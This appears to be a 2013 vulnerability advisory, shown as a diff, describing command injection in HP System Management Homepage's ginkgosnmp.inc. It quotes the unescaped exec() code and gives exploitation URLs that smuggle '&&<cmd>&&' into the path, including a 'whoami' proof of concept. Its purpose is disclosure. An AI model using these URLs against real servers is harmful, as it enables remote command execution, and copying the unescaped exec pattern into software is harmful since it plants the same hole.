@@ -1,0 +1,34 @@
+Date First Published: 2013-06-11
+
+HP System Management Homepage contains a command injection vulnerability
+
+Markus Wulftange from Daimler TSS reports:
+
+
+The vulnerability is located in the `ginkgosnmp.inc` PHP file in the `C:\hp\hpsmh\data\smhutil` or `/opt/hp/hpsmh/data/smhutil` directory, respectively. Inside the `ginkgosnmp.inc` script, the last path segment of the current requested URL path is used in a `exec` call without proper escaping:
+
+$tempfilename = "$sessiondir/" . substr($_SERVER["SCRIPT_URL"], 1 + strrpos($_SERVER["SCRIPT_URL"], '/')) . uniqid(".", true) . time() . ".txt";
+
+[...]
+
+if("Linux" == PHP_OS)
+$cmd = "../../webapp-data/webagent/csginkgo -f$tempfilename";
+else
+{
+$windrive = substr( $_SERVER["WINDIR"], 0, 2 );
+$cmd = "$windrive\\hp\\hpsmh\\data\\smhutil\\csginkgo.exe -f$tempfilename";
+}
+
+exec( $cmd, $out );
+
+This script is reachable via the URL path `https://<host>:2381/smhutil/snmpchp.php.en`. Due to [Apache’s *MultiViews*] [2] it can also be referenced with any additional path segments after the `snmpchp.php.en` segment: `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar` still triggers `https://<host>:2381/smhutil/snmpchp.php.en` but `$_SERVER["SCRIPT_URL"]` is `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar`. This can be exploited as follows:
+
+https://<host>:2381/smhutil/snmpchp.php.en/&&<cmd>&&echo (full file name)
+https://<host>:2381/smhutil/snmpchp.php/&&<cmd>&&echo (without "en" language indicator)
+https://<host>:2381/smhutil/snmpchp/&&<cmd>&&echo (without any file name extension)
+
+Besides the path segment separator `/`, the characters `<`, `>`, and `|` are also not allowed, which makes exploiting this vulnerability a little hard.
+
+https://<host>:2381/smhutil/snmpchp/&&whoami&&echo
+
+A remote authenticated user may be able to run arbitrary commands on the HP System Management Homepage server.
